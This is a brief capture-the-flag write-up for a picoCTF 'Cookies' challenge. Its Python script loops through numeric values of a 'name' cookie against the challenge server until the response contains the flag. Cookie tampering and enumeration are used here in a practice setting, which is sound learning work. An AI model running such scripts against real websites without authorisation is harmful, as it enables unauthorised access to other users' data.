# Cookies

The task was to modify the cookie value and find the right one for the flag.

I wrote a python script that goes through the whole site with changing the cookie value:

```python
import requests

def modify_cookie_and_get_response(url, cookie_name, cookie_value):
    """
    Sends an HTTP GET request to the given URL with a modified cookie.

    :param url: The URL to send the request to
    :param cookie_name: The name of the cookie to modify
    :param cookie_value: The value to set for the cookie
    :return: The response from the server
    """
    # Define the cookies to send with the request
    cookies = {
        cookie_name: cookie_value
    }

    try:
        # Send the GET request with the modified cookie
        response = requests.get(url, cookies=cookies)

        # Return the response
        return response
    except requests.RequestException as e:
        print(f"An error occurred: {e}")
        return None

if __name__ == "__main__":
    # Example usage
    url = "http://mercury.picoctf.net:17781/check" #Change this
    cookie_name = "name"
    
    for i in range(30):
        response = modify_cookie_and_get_response(url, cookie_name, str(i))

        if "pico" in response.text:
            print("\nResponse status code:", response.status_code)
            print("Response headers:\n", response.headers)
            print("\nResponse body:\n", response.text)
```
